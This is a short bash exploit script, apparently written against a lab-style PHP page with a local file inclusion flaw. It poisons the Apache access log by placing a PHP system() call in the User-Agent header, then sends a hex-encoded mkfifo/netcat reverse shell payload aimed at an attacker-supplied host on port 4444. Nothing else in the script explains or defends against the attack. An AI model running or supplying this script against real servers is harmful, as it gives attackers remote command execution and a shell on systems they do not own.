
lfi='lfi'
echo '[+] Overwriting accesslog file...'

curl -H 'User-Agent: Mozilla/5.0 <?php system($_GET['$lfi']); ?> Firefox/70.0' "http://$1/lfi/lfi.php?page=/var/log/apache2/access.log"

sleep 2

echo '[+] encoding payload....'

payload="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $2 4444 >/tmp/f"
encoded_payload=$(echo -ne $payload | hexdump -v -e '/1 "%02x"' | sed 's/\(..\)/%\1/g')
#echo $encoded_payload
sleep 2

echo '[+] Sending reverse shell payload....'
sleep 2

echo '[+] Connecting...'

curl "http://$1/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=$encoded_payload"
